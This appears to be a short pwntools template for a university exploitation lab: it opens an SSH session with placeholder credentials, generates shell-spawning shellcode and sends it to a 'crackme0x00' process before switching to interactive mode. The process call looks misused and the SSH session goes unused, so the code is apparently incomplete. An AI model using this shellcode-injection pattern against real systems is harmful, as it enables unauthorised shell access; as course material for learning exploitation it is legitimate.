from pwn import *


# Connect to your target server with this function
s = ssh('your_login', '<server name>', password='<your_pass_in_canvas')

payload = shellcraft.sh()
# Invoke a process in the target
p = process('./crackme0x00', cmd='/home/lab01/lol')
p.sendline(payload)
p.interactive()
